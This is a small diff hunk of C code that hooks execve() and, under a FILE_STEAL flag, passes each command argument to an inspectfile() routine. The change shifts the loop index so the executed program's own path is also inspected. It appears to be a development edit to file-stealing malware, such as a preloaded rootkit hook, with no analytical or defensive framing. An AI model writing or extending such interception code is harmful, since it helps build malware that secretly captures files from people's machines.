@@ -30,7 +30,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
     }
 
 #ifdef FILE_STEAL
-    for(int i = 1; argv[i] != NULL; i++)
+    for(int i = 0; argv[i] != NULL; i++)
         inspectfile(argv[i]);
 #endif
 
